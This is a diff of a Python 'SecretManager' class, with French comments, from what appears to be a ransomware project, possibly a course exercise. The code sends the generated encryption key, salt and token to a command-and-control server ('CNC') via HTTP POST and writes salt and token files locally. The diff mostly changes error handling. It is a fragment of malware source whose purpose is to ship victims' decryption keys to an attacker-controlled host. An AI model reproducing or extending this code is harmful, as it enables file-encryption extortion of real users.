@@ -54,22 +54,22 @@ class SecretManager:
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
-        return str(tmp, "utf8")
+        return str(tmp, "utf8") 
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         
-        url = f"http://{self._remote_host_port}/new"
+
+        # URL à laquelle on envoie le token , le salt et la key
+        # le ?nufnuf=cochon permet de ne pas avoir de message d'erreur dans le terminal du cnc
+        url = f"http://{self._remote_host_port}/new" 
+
         data = {
             "token" : self.bin_to_b64(token),
             "salt" : self.bin_to_b64(salt),
             "key" : self.bin_to_b64(key)
         }
 
-        try:
-            reponse = requests.post(url, json=data)
-        except ConnectionError as e:
-            self._log.error("ERREUR ET CA FAIT CHIER")
-            raise e
+        reponse = requests.post(url, json=data)
 
         # Vérification de la bonne réception du message
         if reponse.status_code == 200:
@@ -85,8 +85,7 @@ class SecretManager:
 
         # Création du dossier si nécessaire
         os.makedirs(self._path, exist_ok=True)
-
-
+        
         # Génération du chemin de salt.bin
         chemin_pour_salt_dot_bin = os.path.join(self._path, "salt.bin")
         # Génération du chemin de token.bin
@@ -94,10 +93,12 @@ class SecretManager:
 
         # Vérification de la non-existance de salt.bin
         if(os.path.exists(chemin_pour_salt_dot_bin)):
-            os.remove(chemin_pour_salt_dot_bin)
+            raise FileExistsError("salt.bin already exists")
+        
         # Vérification de la non-existance de token.bin
         if(os.path.exists(chemin_pour_token_dot_bin)):
-            os.remove(chemin_pour_token_dot_bin)
+            raise FileExistsError("token.bin already exists")
+        
 
         # Ecriture du fichier salt.bin 
         fichier_salt_dot_bin = open(chemin_pour_salt_dot_bin, 'wb') 
@@ -107,7 +108,6 @@ class SecretManager:
         chemin_pour_token_dot_bin = open(chemin_pour_token_dot_bin, 'wb') 
         chemin_pour_token_dot_bin.write(self._token)
         chemin_pour_token_dot_bin.close()
-
 
         # Envoi des données au CNC
         self.post_new(salt  = self._salt,
